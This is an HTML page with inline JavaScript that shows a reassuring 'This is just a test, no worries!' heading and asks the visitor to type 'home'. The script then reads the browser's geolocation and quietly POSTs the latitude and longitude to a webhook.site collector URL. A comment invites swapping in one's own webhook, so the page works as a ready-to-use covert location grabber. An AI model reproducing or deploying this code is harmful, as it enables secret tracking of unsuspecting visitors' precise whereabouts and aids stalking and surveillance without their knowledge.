<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Document</title>
  <script>
    window.onload = function() {
      document.getElementById("btn").addEventListener("click", getLocation);
    };

    function getLocation() {
      navigator.geolocation.getCurrentPosition(function(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        let input = document.getElementById("input").value;
        let inputCorrection = input.toLowerCase();
        let output = document.getElementById("output");

        if (inputCorrection == "home") {
          output.innerHTML =
            "latitude: " + latitude + "<br>" + "longitude: " + longitude;

          // Send GPS data to Webhook.site
          sendDataToWebhook(latitude, longitude);
        } else {
          alert("Please try again!");
        }
      });
    }

    function sendDataToWebhook(latitude, longitude) {
      const data = {
        latitude,
        longitude
      };

      // Replace the URL below with your Webhook URL
      fetch("https://webhook.site/195c3dae-0ba0-469f-95ad-253b1b6d4016", {
          method: "POST", // HTTP method
          headers: {
            "Content-Type": "application/json", // Specify JSON format
          },
          body: JSON.stringify(data), // Send GPS data as JSON
        })
        .then((response) => {
          if (response.ok) {
            console.log("Data successfully sent!");
          } else {
            console.error("Failed to send data!");
          }
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    }
  </script>
</head>

<body>
  <h1>This is just a test, no worries!</h1>
  <div class="container">
    <input type="text" id="input" placeholder="write home here" />
    <button id="btn">submit</button>
    <p id="output"></p>
  </div>
</body>

</html>